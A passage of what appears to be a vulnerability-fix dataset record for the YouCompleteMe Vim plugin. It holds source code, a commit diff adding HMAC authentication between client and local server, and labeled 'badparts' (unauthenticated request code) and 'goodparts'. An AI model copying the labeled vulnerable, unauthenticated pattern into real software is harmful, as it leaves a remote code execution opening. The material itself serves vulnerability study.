)\n\nNUM_YCMD_STDERR_LINES_ON_CRASH = 30\nSERVER_CRASH_MESSAGE_STDERR_FILE = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n  'Stderr (last {0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )\nSERVER_CRASH_MESSAGE_SAME_STDERR = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '\n  ' check console output for logs!' )\nSERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours\n\n\nclass YouCompleteMe( object ):\n  def __init__( self, user_options ):\n    self._user_options = user_options\n    self._user_notified_about_crash = False\n    self._diag_interface = DiagnosticInterface( user_options )\n    self._omnicomp = OmniCompleter( user_options )\n    self._latest_completion_request = None\n    self._latest_file_parse_request = None\n    self._server_stdout = None\n    self._server_stderr = None\n    self._server_popen = None\n    self._filetypes_with_keywords_loaded = set()\n    self._temp_options_filename = None\n    self._ycmd_keepalive = YcmdKeepalive()\n    self._SetupServer()\n    self._ycmd_keepalive.Start()\n\n  def _SetupServer( self ):\n    server_port = utils.GetUnusedLocalhostPort()\n    with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n      self._temp_options_filename = options_file.name\n      json.dump( dict( self._user_options ), options_file )\n      options_file.flush()\n\n      args = [ utils.PathToPythonInterpreter(),\n               _PathToServerScript(),\n               '--port={0}'.format( server_port ),\n               '--options_file={0}'.format( options_file.name ),\n               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),\n               '--idle_suicide_seconds={0}'.format(\n                  SERVER_IDLE_SUICIDE_SECONDS )]\n\n      if not self._user_options[ 'server_use_vim_stdout' ]:\n        filename_format = os.path.join( utils.PathToTempDir(),\n                                        'server_{port}_{std}.log' )\n\n        self._server_stdout = filename_format.format( port = server_port,\n                                                      std = 'stdout' )\n        self._server_stderr = filename_format.format( port = server_port,\n                                                      std = 'stderr' )\n        args.append('--stdout={0}'.format( self._server_stdout ))\n        args.append('--stderr={0}'.format( self._server_stderr ))\n\n        if self._user_options[ 'server_keep_logfiles' ]:\n          args.append('--keep_logfiles')\n\n      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n      BaseRequest.server_location = 'http://localhost:' + str( server_port )\n\n    self._NotifyUserIfServerCrashed()\n\n  def _IsServerAlive( self ):\n    returncode = self._server_popen.poll()\n    # When the process hasn't finished yet, poll() returns None.\n    return returncode is None\n\n\n  def _NotifyUserIfServerCrashed( self ):\n    if self._user_notified_about_crash or self._IsServerAlive():\n      return\n    self._user_notified_about_crash = True\n    if self._server_stderr:\n      with open( self._server_stderr, 'r' ) as server_stderr_file:\n        error_output = ''.join( server_stderr_file.readlines()[\n            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )\n        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +\n                                        error_output )\n    else:\n        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )\n\n\n  def ServerPid( self ):\n    if not self._server_popen:\n      return -1\n    return self._server_popen.pid\n\n\n  def _ServerCleanup( self ):\n    if self._IsServerAlive():\n      self._server_popen.terminate()\n    utils.RemoveIfExists( self._temp_options_filename )\n\n\n  def RestartServer( self ):\n    vimsupport.PostVimMessage( 'Restarting ycmd server...' )\n    self._user_notified_about_crash = False\n    self._ServerCleanup()\n    self._SetupServer()\n\n\n  def CreateCompletionRequest( self, force_semantic = False ):\n    # We have to store a reference to the newly created CompletionRequest\n    # because VimScript can't store a reference to a Python object across\n    # function calls... Thus we need to keep this request somewhere.\n    if ( not self.NativeFiletypeCompletionAvailable() and\n         self.CurrentFiletypeCompletionEnabled() and\n         self._omnicomp.ShouldUseNow() ):\n      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )\n    else:\n      extra_data = {}\n      self._AddExtraConfDataIfNeeded( extra_data )\n      if force_semantic:\n        extra_data[ 'force_semantic' ] = True\n\n      self._latest_completion_request = ( CompletionRequest( extra_data )\n                                          if self._IsServerAlive() else\n                                          None )\n    return self._latest_completion_request\n\n\n  def SendCommandRequest( self, arguments, completer ):\n    if self._IsServerAlive():\n      return SendCommandRequest( arguments, completer )\n\n\n  def GetDefinedSubcommands( self ):\n    if self._IsServerAlive():\n      return BaseRequest.PostDataToHandler( BuildRequestData(),\n                                            'defined_subcommands' )\n    else:\n      return []\n\n\n  def GetCurrentCompletionRequest( self ):\n    return self._latest_completion_request\n\n\n  def GetOmniCompleter( self ):\n    return self._omnicomp\n\n\n  def NativeFiletypeCompletionAvailable( self ):\n    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in\n                  vimsupport.CurrentFiletypes() ] )\n\n\n  def NativeFiletypeCompletionUsable( self ):\n    return ( self.CurrentFiletypeCompletionEnabled() and\n             self.NativeFiletypeCompletionAvailable() )\n\n\n  def OnFileReadyToParse( self ):\n    self._omnicomp.OnFileReadyToParse( None )\n\n    if not self._IsServerAlive():\n      self._NotifyUserIfServerCrashed()\n\n    extra_data = {}\n    self._AddTagsFilesIfNeeded( extra_data )\n    self._AddSyntaxDataIfNeeded( extra_data )\n    self._AddExtraConfDataIfNeeded( extra_data )\n\n    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',\n                                                          extra_data )\n    self._latest_file_parse_request.Start()\n\n\n  def OnBufferUnload( self, deleted_buffer_file ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'BufferUnload',\n                                { 'unloaded_buffer': deleted_buffer_file } )\n\n\n  def OnBufferVisit( self ):\n    if not self._IsServerAlive():\n      return\n    extra_data = {}\n    _AddUltiSnipsDataIfNeeded( extra_data )\n    SendEventNotificationAsync( 'BufferVisit', extra_data )\n\n\n  def OnInsertLeave( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'InsertLeave' )\n\n\n  def OnCursorMoved( self ):\n    self._diag_interface.OnCursorMoved()\n\n\n  def OnVimLeave( self ):\n    self._ServerCleanup()\n\n\n  def OnCurrentIdentifierFinished( self ):\n    if not self._IsServerAlive():\n      return\n    SendEventNotificationAsync( 'CurrentIdentifierFinished' )\n\n\n  def DiagnosticsForCurrentFileReady( self ):\n    return bool( self._latest_file_parse_request and\n                 self._latest_file_parse_request.Done() )\n\n\n  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):\n    if self.DiagnosticsForCurrentFileReady():\n      diagnostics = self._latest_file_parse_request.Response()\n      # We set the diagnostics request to None because we want to prevent\n      # Syntastic from repeatedly refreshing the buffer with the same diags.\n      # Setting this to None makes DiagnosticsForCurrentFileReady return False\n      # until the next request is created.\n      self._latest_file_parse_request = None\n      if qflist_format:\n        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )\n      else:\n        return diagnostics\n    return []\n\n\n  def UpdateDiagnosticInterface( self ):\n    if not self.DiagnosticsForCurrentFileReady():\n      return\n    self._diag_interface.UpdateWithNewDiagnostics(\n      self.GetDiagnosticsFromStoredRequest() )\n\n\n  def ShowDetailedDiagnostic( self ):\n    if not self._IsServerAlive():\n      return\n    try:\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'detailed_diagnostic' )\n      if 'message' in debug_info:\n        vimsupport.EchoText( debug_info[ 'message' ] )\n    except ServerError as e:\n      vimsupport.PostVimMessage( str( e ) )\n\n\n  def DebugInfo( self ):\n    if self._IsServerAlive():\n      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),\n                                                  'debug_info' )\n    else:\n      debug_info = 'Server crashed, no debug info from server'\n    debug_info += '\\nServer running at: {0}'.format(\n        BaseRequest.server_location )\n    debug_info += '\\nServer process ID: {0}'.format( self._server_popen.pid )\n    if self._server_stderr or self._server_stdout:\n      debug_info += '\\nServer logfiles:\\n  {0}\\n  {1}'.format(\n        self._server_stdout,\n        self._server_stderr )\n\n    return debug_info\n\n\n  def CurrentFiletypeCompletionEnabled( self ):\n    filetypes = vimsupport.CurrentFiletypes()\n    filetype_to_disable = self._user_options[\n      'filetype_specific_completion_to_disable' ]\n    return not all([ x in filetype_to_disable for x in filetypes ])\n\n\n  def _AddSyntaxDataIfNeeded( self, extra_data ):\n    if not self._user_options[ 'seed_identifiers_with_syntax' ]:\n      return\n    filetype = vimsupport.CurrentFiletypes()[ 0 ]\n    if filetype in self._filetypes_with_keywords_loaded:\n      return\n\n    self._filetypes_with_keywords_loaded.add( filetype )\n    extra_data[ 'syntax_keywords' ] = list(\n       syntax_parse.SyntaxKeywordsForCurrentBuffer() )\n\n\n  def _AddTagsFilesIfNeeded( self, extra_data ):\n    def GetTagFiles():\n      tag_files = vim.eval( 'tagfiles()' )\n      current_working_directory = os.getcwd()\n      return [ os.path.join( current_working_directory, x ) for x in tag_files ]\n\n    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:\n      return\n    extra_data[ 'tag_files' ] = GetTagFiles()\n\n\n  def _AddExtraConfDataIfNeeded( self, extra_data ):\n    def BuildExtraConfData( extra_conf_vim_data ):\n      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )\n                   for expr in extra_conf_vim_data )\n\n    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]\n    if extra_conf_vim_data:\n      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(\n        extra_conf_vim_data )\n\n\ndef _PathToServerScript():\n  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )\n  return os.path.join( dir_of_current_script, 'server/ycmd.py' )\n\n\ndef _AddUltiSnipsDataIfNeeded( extra_data ):\n  if not USE_ULTISNIPS_DATA:\n    return\n\n  try:\n    rawsnips = UltiSnips_Manager._snips( '', 1 )\n  except:\n    return\n\n  # UltiSnips_Manager._snips() returns a class instance where:\n  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )\n  # class.description - description of the snippet\n  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,\n                                           'description': x.description\n                                         } for x in rawsnips ]\n\n\n"}}, "msg": "Client/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution."}}, "https://github.com/grinchios/vimplugins": {"e965e0284789e610c0a50d20a92a82ec5c135064": {"url": "https://api.github.com/repos/grinchios/vimplugins/commits/e965e0284789e610c0a50d20a92a82ec5c135064", "html_url": "https://github.com/grinchios/vimplugins/commit/e965e0284789e610c0a50d20a92a82ec5c135064", "message": "Client/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution.", "sha": "e965e0284789e610c0a50d20a92a82ec5c135064", "keyword": "remote code execution prevent", "diff": "diff --git a/python/ycm/client/base_request.py b/python/ycm/client/base_request.py\nindex 7f609727..c9c417f4 100644\n--- a/python/ycm/client/base_request.py\n+++ b/python/ycm/client/base_request.py\n@@ -24,6 +24,7 @@\n from requests_futures.sessions import FuturesSession\n from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\n from ycm import vimsupport\n+from ycm import utils\n from ycm.utils import ToUtf8Json\n from ycm.server.responses import ServerError, UnknownExtraConf\n \n@@ -31,6 +32,7 @@\n _EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n # Setting this to None seems to screw up the Requests/urllib3 libs.\n _DEFAULT_TIMEOUT_SEC = 30\n+_HMAC_HEADER = 'x-ycm-hmac'\n \n class BaseRequest( object ):\n   def __init__( self ):\n@@ -88,24 +90,28 @@ def _TalkToHandlerAsync( data,\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n@@ -113,8 +119,18 @@ def DelayedSendRequest( data, handler, method ):\n     return SendRequest( data, handler, method, timeout )\n \n \n+  @staticmethod\n+  def _ExtraHeaders( request_body = None ):\n+    if not request_body:\n+      request_body = ''\n+    headers = dict( _HEADERS )\n+    headers[ _HMAC_HEADER ] = utils.CreateHexHmac( request_body,\n+                                                   BaseRequest.hmac_secret )\n+    return headers\n+\n   session = FuturesSession( executor = _EXECUTOR )\n   server_location = 'http://localhost:6666'\n+  hmac_secret = ''\n \n \n def BuildRequestData( start_column = None,\n@@ -141,6 +157,7 @@ def BuildRequestData( start_column = None,\n \n def JsonFromFuture( future ):\n   response = future.result()\n+  _ValidateResponseObject( response )\n   if response.status_code == requests.codes.server_error:\n     _RaiseExceptionForData( response.json() )\n \n@@ -153,6 +170,13 @@ def JsonFromFuture( future ):\n   return None\n \n \n+def _ValidateResponseObject( response ):\n+  if not utils.ContentHexHmacValid( response.content,\n+                                    response.headers[ _HMAC_HEADER ],\n+                                    BaseRequest.hmac_secret ):\n+    raise RuntimeError( 'Received invalid HMAC for response!' )\n+  return True\n+\n def _BuildUri( handler ):\n   return urlparse.urljoin( BaseRequest.server_location, handler )\n \n@@ -163,7 +187,9 @@ def _CheckServerIsHealthyWithCache():\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n \ndiff --git a/python/ycm/server/hmac_plugin.py b/python/ycm/server/hmac_plugin.py\nnew file mode 100644\nindex 00000000..b433b2b0\n--- /dev/null\n+++ b/python/ycm/server/hmac_plugin.py\n@@ -0,0 +1,57 @@\n+#!/usr/bin/env python\n+#\n+# Copyright (C) 2014  Google Inc.\n+#\n+# This file is part of YouCompleteMe.\n+#\n+# YouCompleteMe is free software: you can redistribute it and/or modify\n+# it under the terms of the GNU General Public License as published by\n+# the Free Software Foundation, either version 3 of the License, or\n+# (at your option) any later version.\n+#\n+# YouCompleteMe is distributed in the hope that it will be useful,\n+# but WITHOUT ANY WARRANTY; without even the implied warranty of\n+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n+# GNU General Public License for more details.\n+#\n+# You should have received a copy of the GNU General Public License\n+# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n+\n+import logging\n+import httplib\n+from bottle import request, response, abort\n+from ycm import utils\n+\n+_HMAC_HEADER = 'x-ycm-hmac'\n+\n+# This class implements the Bottle plugin API:\n+# http://bottlepy.org/docs/dev/plugindev.html\n+#\n+# We want to ensure that every request coming in has a valid HMAC set in the\n+# x-ycm-hmac header and that every response coming out sets such a valid header.\n+# This is to prevent security issues with possible remote code execution.\n+class HmacPlugin( object ):\n+  name = 'hmac'\n+  api = 2\n+\n+\n+  def __init__( self, hmac_secret ):\n+    self._hmac_secret = hmac_secret\n+    self._logger = logging.getLogger( __name__ )\n+\n+\n+  def __call__( self, callback ):\n+    def wrapper( *args, **kwargs ):\n+      body = request.body.read()\n+      if not utils.ContentHexHmacValid( body,\n+                                        request.headers[ _HMAC_HEADER ],\n+                                        self._hmac_secret ):\n+        self._logger.info( 'Dropping request with bad HMAC.' )\n+        abort( httplib.UNAUTHORIZED, 'Unauthorized, received bad HMAC.')\n+        return\n+      body = callback( *args, **kwargs )\n+      response.headers[ _HMAC_HEADER ] = utils.CreateHexHmac(\n+          body, self._hmac_secret )\n+      return body\n+    return wrapper\n+\ndiff --git a/python/ycm/server/ycmd.py b/python/ycm/server/ycmd.py\nindex 34e66172..64b0f07f 100755\n--- a/python/ycm/server/ycmd.py\n+++ b/python/ycm/server/ycmd.py\n@@ -27,10 +27,12 @@\n import waitress\n import signal\n import os\n+import base64\n from ycm import user_options_store\n from ycm import extra_conf_store\n from ycm import utils\n from ycm.server.watchdog_plugin import WatchdogPlugin\n+from ycm.server.hmac_plugin import HmacPlugin\n \n def YcmCoreSanityCheck():\n   if 'ycm_core' in sys.modules:\n@@ -103,6 +105,8 @@ def Main():\n   options = ( json.load( open( args.options_file, 'r' ) )\n               if args.options_file\n               else user_options_store.DefaultOptions() )\n+  utils.RemoveIfExists( args.options_file )\n+  hmac_secret = base64.b64decode( options[ 'hmac_secret' ] )\n   user_options_store.SetAll( options )\n \n   # This ensures that ycm_core is not loaded before extra conf\n@@ -126,6 +130,7 @@ def Main():\n   handlers.UpdateUserOptions( options )\n   SetUpSignalHandler(args.stdout, args.stderr, args.keep_logfiles)\n   handlers.app.install( WatchdogPlugin( args.idle_suicide_seconds ) )\n+  handlers.app.install( HmacPlugin( hmac_secret ) )\n   waitress.serve( handlers.app,\n                   host = args.host,\n                   port = args.port,\ndiff --git a/python/ycm/utils.py b/python/ycm/utils.py\nindex d9128716..095337c9 100644\n--- a/python/ycm/utils.py\n+++ b/python/ycm/utils.py\n@@ -25,6 +25,8 @@\n import socket\n import stat\n import json\n+import hmac\n+import hashlib\n from distutils.spawn import find_executable\n import subprocess\n import collections\n@@ -212,3 +214,11 @@ def SafePopen( *args, **kwargs ):\n   return subprocess.Popen( *args, **kwargs )\n \n \n+def ContentHexHmacValid( content, hmac, hmac_secret ):\n+  return hmac == CreateHexHmac( content, hmac_secret )\n+\n+\n+def CreateHexHmac( content, hmac_secret ):\n+  return hmac.new( hmac_secret,\n+                   msg = content,\n+                   digestmod = hashlib.sha256 ).hexdigest()\ndiff --git a/python/ycm/youcompleteme.py b/python/ycm/youcompleteme.py\nindex 448236eb..83849ce1 100644\n--- a/python/ycm/youcompleteme.py\n+++ b/python/ycm/youcompleteme.py\n@@ -22,6 +22,7 @@\n import tempfile\n import json\n import signal\n+import base64\n from subprocess import PIPE\n from ycm import vimsupport\n from ycm import utils\n@@ -58,6 +59,7 @@\n # Ctrl-C in Vim.\n signal.signal( signal.SIGINT, signal.SIG_IGN )\n \n+HMAC_SECRET_LENGTH = 16\n NUM_YCMD_STDERR_LINES_ON_CRASH = 30\n SERVER_CRASH_MESSAGE_STDERR_FILE = (\n   'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n@@ -80,16 +82,18 @@ def __init__( self, user_options ):\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n@@ -116,6 +120,7 @@ def _SetupServer( self ):\n \n       self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n       BaseRequest.server_location = 'http://localhost:' + str( server_port )\n+      BaseRequest.hmac_secret = hmac_secret\n \n     self._NotifyUserIfServerCrashed()\n \n@@ -148,7 +153,6 @@ def ServerPid( self ):\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n", "files": {"/python/ycm/client/base_request.py": {"changes": [{"diff": "\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n", "add": 14, "remove": 10, "filename": "/python/ycm/client/base_request.py", "badparts": ["        return BaseRequest.session.post( _BuildUri( handler ),", "                                        data = ToUtf8Json( data ),", "                                        headers = _HEADERS,", "                                        timeout = timeout )", "        return BaseRequest.session.get( _BuildUri( handler ),", "                                        headers = _HEADERS,", "                                        timeout = timeout )", "                              data = ToUtf8Json( data ),", "                              headers = _HEADERS )", "                             headers = _HEADERS )"], "goodparts": ["        sent_data = ToUtf8Json( data )", "        return BaseRequest.session.post(", "            _BuildUri( handler ),", "            data = sent_data,", "            headers = BaseRequest._ExtraHeaders( sent_data ),", "            timeout = timeout )", "        return BaseRequest.session.get(", "            _BuildUri( handler ),", "            headers = BaseRequest._ExtraHeaders(),", "            timeout = timeout )", "        sent_data = ToUtf8Json( data )", "                              data = sent_data,", "                              headers = BaseRequest._ExtraHeaders( sent_data ) )", "                             headers = BaseRequest._ExtraHeaders() )"]}, {"diff": "\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ", "add": 3, "remove": 1, "filename": "/python/ycm/client/base_request.py", "badparts": ["    response = requests.get( _BuildUri( 'healthy' ) )"], "goodparts": ["    response = requests.get( _BuildUri( 'healthy' ),", "                             headers = BaseRequest._ExtraHeaders() )", "    _ValidateResponseObject( response )"]}], "source": "\n import vim import requests import urlparse from retries import retries from requests_futures.sessions import FuturesSession from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor from ycm import vimsupport from ycm.utils import ToUtf8Json from ycm.server.responses import ServerError, UnknownExtraConf _HEADERS={'content-type': 'application/json'} _EXECUTOR=UnsafeThreadPoolExecutor( max_workers=30) _DEFAULT_TIMEOUT_SEC=30 class BaseRequest( object): def __init__( self): pass def Start( self): pass def Done( self): return True def Response( self): return{} @staticmethod def GetDataFromHandler( handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '', handler, 'GET', timeout)) @staticmethod def PostDataToHandler( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data, handler, timeout)) @staticmethod def PostDataToHandlerAsync( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout) @staticmethod def _TalkToHandlerAsync( data, handler, method, timeout=_DEFAULT_TIMEOUT_SEC): def SendRequest( data, handler, method, timeout): if method=='POST': return BaseRequest.session.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS, timeout=timeout) if method=='GET': return BaseRequest.session.get( _BuildUri( handler), headers=_HEADERS, timeout=timeout) @retries( 5, delay=0.5, backoff=1.5) def DelayedSendRequest( data, handler, method): if method=='POST': return requests.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS) if method=='GET': return requests.get( _BuildUri( handler), headers=_HEADERS) if not _CheckServerIsHealthyWithCache(): return _EXECUTOR.submit( DelayedSendRequest, data, handler, method) return SendRequest( data, handler, method, timeout) session=FuturesSession( executor=_EXECUTOR) server_location='http://localhost:6666' def BuildRequestData( start_column=None, query=None, include_buffer_data=True): line, column=vimsupport.CurrentLineAndColumn() filepath=vimsupport.GetCurrentBufferFilepath() request_data={ 'filetypes': vimsupport.CurrentFiletypes(), 'line_num': line, 'column_num': column, 'start_column': start_column, 'line_value': vim.current.line, 'filepath': filepath } if include_buffer_data: request_data[ 'file_data']=vimsupport.GetUnsavedAndCurrentBufferData() if query: request_data[ 'query']=query return request_data def JsonFromFuture( future): response=future.result() if response.status_code==requests.codes.server_error: _RaiseExceptionForData( response.json()) response.raise_for_status() if response.text: return response.json() return None def _BuildUri( handler): return urlparse.urljoin( BaseRequest.server_location, handler) SERVER_HEALTHY=False def _CheckServerIsHealthyWithCache(): global SERVER_HEALTHY def _ServerIsHealthy(): response=requests.get( _BuildUri( 'healthy')) response.raise_for_status() return response.json() if SERVER_HEALTHY: return True try: SERVER_HEALTHY=_ServerIsHealthy() return SERVER_HEALTHY except: return False def _RaiseExceptionForData( data): if data[ 'exception'][ 'TYPE']==UnknownExtraConf.__name__: raise UnknownExtraConf( data[ 'exception'][ 'extra_conf_file']) raise ServerError( '{0}:{1}'.format( data[ 'exception'][ 'TYPE'], data[ 'message'])) ", "sourceWithComments": "#!/usr/bin/env python\n#\n# Copyright (C) 2013  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.\n\nimport vim\nimport requests\nimport urlparse\nfrom retries import retries\nfrom requests_futures.sessions import FuturesSession\nfrom ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\nfrom ycm import vimsupport\nfrom ycm.utils import ToUtf8Json\nfrom ycm.server.responses import ServerError, UnknownExtraConf\n\n_HEADERS = {'content-type': 'application/json'}\n_EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n# Setting this to None seems to screw up the Requests/urllib3 libs.\n_DEFAULT_TIMEOUT_SEC = 30\n\nclass BaseRequest( object ):\n  def __init__( self ):\n    pass\n\n\n  def Start( self ):\n    pass\n\n\n  def Done( self ):\n    return True\n\n\n  def Response( self ):\n    return {}\n\n  # This method blocks\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def GetDataFromHandler( handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '',\n                                                            handler,\n                                                            'GET',\n                                                            timeout ) )\n\n\n  # This is the blocking version of the method. See below for async.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandler( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data,\n                                                               handler,\n                                                               timeout ) )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandlerAsync( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |method| is either 'POST' or 'GET'.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def _TalkToHandlerAsync( data,\n                           handler,\n                           method,\n                           timeout = _DEFAULT_TIMEOUT_SEC ):\n    def SendRequest( data, handler, method, timeout ):\n      if method == 'POST':\n        return BaseRequest.session.post( _BuildUri( handler ),\n                                        data = ToUtf8Json( data ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n      if method == 'GET':\n        return BaseRequest.session.get( _BuildUri( handler ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n\n    @retries( 5, delay = 0.5, backoff = 1.5 )\n    def DelayedSendRequest( data, handler, method ):\n      if method == 'POST':\n        return requests.post( _BuildUri( handler ),\n                              data = ToUtf8Json( data ),\n                              headers = _HEADERS )\n      if method == 'GET':\n        return requests.get( _BuildUri( handler ),\n                             headers = _HEADERS )\n\n    if not _CheckServerIsHealthyWithCache():\n      return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n\n    return SendRequest( data, handler, method, timeout )\n\n\n  